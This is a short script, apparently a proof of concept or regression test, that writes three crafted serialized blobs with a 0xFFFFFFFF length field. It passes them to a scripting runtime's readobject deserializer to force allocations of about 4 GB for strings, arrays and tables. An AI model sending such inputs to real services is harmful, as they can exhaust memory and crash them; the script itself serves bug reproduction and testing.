let { blob } = require("iostream")

local function make_payload(type_byte) {
    local b = blob()
    b.writen(0xEA, 'b')       // START_MARKER
    b.writen(type_byte, 'b')  // object type + size variant
    b.writen(-1, 'i')         // 0xFFFFFFFF as uint32_t  (~4 GB)
    b.seek(0, 'b')
    return b
}

println("VARIANT 1: TP_STRING len=0xFFFFFFFF -> sq_getscratchpad(vm, ~4GB)")
try { make_payload(0x43).readobject() }
catch(e) { println("  caught: " + e) }

println("VARIANT 2: TP_ARRAY size=0xFFFFFFFF -> sq_newarray(vm, ~4GB)")
try { make_payload(0x52).readobject() }
catch(e) { println("  caught: " + e) }

println("VARIANT 3: TP_TABLE size=0xFFFFFFFF -> sq_newtableex(vm, ~4GB)")
try { make_payload(0x62).readobject() }
catch(e) { println("  caught: " + e) }

println("done")
